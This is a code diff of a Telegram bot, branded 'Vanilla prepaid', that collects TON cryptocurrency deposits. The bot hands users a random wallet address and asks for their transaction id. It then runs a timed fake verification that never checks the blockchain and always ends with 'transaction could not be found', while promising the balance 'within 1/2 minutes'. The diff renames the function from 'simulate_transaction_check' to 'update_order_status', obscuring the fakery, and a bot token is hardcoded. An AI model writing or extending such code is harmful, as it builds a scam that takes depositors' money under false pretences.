@@ -19,7 +19,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ✅ সঠিক টোকেন সেটআপ (এনভায়রনমেন্ট ভেরিয়েবল বা ডিফল্ট)
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8713347006:AAEDPUsTmPGs8EerMiexMmdlmHiS8mdMtvE")
 PORT = int(os.environ.get("PORT", 8080))
 
@@ -330,8 +329,7 @@ class KeyboardBuilder:
     def get_deposit_keyboard() -> InlineKeyboardMarkup:
         keyboard = [
             [InlineKeyboardButton("Confirm ✅", callback_data="deposit_confirm")],
-            [InlineKeyboardButton("Cancel ⛔", callback_data="deposit_cancel")],
-            [InlineKeyboardButton("✆ Contact", url="https://t.me/Vanilagcm")]
+            [InlineKeyboardButton("Cancel ⛔", callback_data="deposit_cancel")]
         ]
         return InlineKeyboardMarkup(keyboard)
 
@@ -458,8 +456,10 @@ async def send_listing_page(update: Update, context: ContextTypes.DEFAULT_TYPE, 
 
 
 async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Randomly select an address from the list
     selected_address = random.choice(DEPOSIT_ADDRESSES)
 
+    # Store deposit data for this user
     user_id = update.effective_user.id
     user_deposit_data[user_id] = {
         'address': selected_address,
@@ -469,8 +469,8 @@ async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
     message = (
-        f"⚡ Vanilla prepaid — TON DEPOSIT ⚡\n\n\n\n"
-        f"Deposit Information: `{selected_address}`\n\n\n\n"
+        f"⚡ Vanilla prepaid — TON DEPOSIT ⚡\n\n"
+        f"Deposit Information: `{selected_address}`\n\n"
         "Minimum Deposit: `15 TON`\n"
         "Instructions:\n"
         "1. Send your deposit to the address above.\n"
@@ -483,6 +483,7 @@ async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚠️ Note: This deposit session is only active for 30 minutes. Please send your deposit before it expires."
     )
 
+    # Use the deposit keyboard with Confirm and Cancel
     if update.callback_query:
         await update.callback_query.edit_message_text(message, reply_markup=keyboard_builder.get_deposit_keyboard(), parse_mode='Markdown')
     else:
@@ -499,7 +500,9 @@ async def deposit_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def deposit_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    await query.edit_message_text("Deposit request has been canceled.❌\nYou can now create a new deposit request.✅")
+    # Delete the deposit message and send cancellation message
+    await query.delete_message()
+    await update.effective_chat.send_message("Deposit request has been canceled.❌\nYou can now create a new deposit request.✅")
     context.user_data.pop('awaiting_deposit_amount', None)
     context.user_data.pop('awaiting_txid', None)
 
@@ -531,30 +534,42 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         deposit_data = user_deposit_data.get(user_id, {})
         amount = deposit_data.get('amount', 0)
         order_number = user_manager.get_next_order_number()
+        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
+        # Clear the state
         context.user_data['awaiting_txid'] = False
 
+        # Build order message with copy-friendly inline buttons
+        # We'll create inline buttons for each field that show the value in an alert (which can be copied on some devices)
+        # However, to keep it clean, we'll send the order as plain text with a separate contact button.
+        # For copy functionality, user can long-press any text.
         order_text = (
-            f"NAME: `{user.first_name}`\n\n"
+            f"⚡ ORDER DETAILS ⚡\n\n"
+            f"NAME: `{user.first_name}`\n"
+            f"ID: `{user.user_id}`\n"
             f"AMOUNT: `{amount}` TON\n"
             f"Txid: `{txid}`\n"
             f"Order Number: `{order_number}`\n"
             f"Stats: Waiting...\n"
-            f"TIME: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
+            f"TIME: `{current_time}`\n\n"
             "NOTE: Balance will be added within 1/2 minutes. If not added, contact customer care."
         )
 
         keyboard = [[InlineKeyboardButton("✆ Contact", url="https://t.me/Vanilagcm")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
+        # Send the order message
         message = await update.message.reply_text(order_text, parse_mode='Markdown', reply_markup=reply_markup)
 
-        asyncio.create_task(simulate_transaction_check(context, message.chat_id, message.message_id, order_text))
+        # Start the status update sequence
+        asyncio.create_task(update_order_status(context, message.chat_id, message.message_id, order_text, amount, txid, order_number, current_time, user))
 
 
-async def simulate_transaction_check(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, original_text: str):
+async def update_order_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, original_text: str, amount: float, txid: str, order_number: int, current_time: str, user: UserData):
+    # Wait 50 seconds
     await asyncio.sleep(50)
 
+    # Update to Processing...
     processing_text = original_text.replace("Stats: Waiting...", "Stats: Processing....")
     try:
         await context.bot.edit_message_text(
@@ -564,10 +579,12 @@ async def simulate_transaction_check(context: ContextTypes.DEFAULT_TYPE, chat_id
             parse_mode='Markdown'
         )
     except Exception as e:
-        logger.error(f"Error editing message: {e}")
+        logger.error(f"Error editing message to Processing: {e}")
 
+    # Wait another 55 seconds
     await asyncio.sleep(55)
 
+    # Update to transaction not found
     failed_text = processing_text.replace("Stats: Processing....", "Stats: transaction could not be found.")
     try:
         await context.bot.edit_message_text(
@@ -577,7 +594,7 @@ async def simulate_transaction_check(context: ContextTypes.DEFAULT_TYPE, chat_id
             parse_mode='Markdown'
         )
     except Exception as e:
-        logger.error(f"Error editing message: {e}")
+        logger.error(f"Error editing message to failed: {e}")
 
 
 async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
